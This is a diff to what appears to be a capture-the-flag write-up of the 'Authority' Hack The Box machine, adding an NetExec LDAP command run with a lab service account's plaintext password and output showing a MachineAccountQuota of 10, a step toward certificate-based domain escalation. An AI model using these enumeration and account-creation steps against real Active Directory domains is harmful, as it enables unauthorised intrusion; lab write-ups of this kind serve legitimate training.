@@ -517,5 +517,14 @@ I needed the admins SID for the attack so here i am requesting it
 Now after re-reading the output from certipy i see that the enrollment is domain computers not domain users, so ill have to create a computer account
 
 ```python
+nxc ldap authority.authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
+LDAP        10.129.229.56   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
+LDAP        10.129.229.56   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
+MAQ         10.129.229.56   389    AUTHORITY        [*] Getting the MachineAccountQuota
+MAQ         10.129.229.56   389    AUTHORITY        MachineAccountQuota: 10
+```
+The MAQ is set to 10 so i can make a computer acount
+
+```python
 
 ```
